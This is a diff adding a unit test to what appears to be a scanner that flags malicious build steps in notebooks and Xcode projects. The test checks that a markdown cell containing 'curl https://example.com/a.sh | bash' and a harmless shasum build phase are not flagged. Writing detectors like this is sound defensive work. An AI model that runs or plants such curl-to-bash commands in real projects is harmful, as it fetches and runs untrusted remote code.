@@ -129,5 +129,15 @@ suite('Roadmap Stage 2 Builds & Notebooks', () => {
       `;
       expect(scanMsbuildProject(clean, 'Clean.csproj')).to.deep.equal([]);
     });
+
+    test('ignores markdown cells in Jupyter and libcurl/shasum in Xcode', () => {
+      const mdNb = JSON.stringify({
+        cells: [{ cell_type: 'markdown', source: '!curl https://example.com/a.sh | bash\n' }],
+      });
+      expect(scanJupyterNotebook(mdNb, 'docs.ipynb')).to.deep.equal([]);
+
+      const cleanXcode = `/* Begin PBXShellScriptBuildPhase section */\nABC = { isa = PBXShellScriptBuildPhase; shellScript = "echo libcurl | shasum -a 256"; };`;
+      expect(scanXcodePbxproj(cleanXcode, 'App.xcodeproj/project.pbxproj')).to.deep.equal([]);
+    });
   });
 });
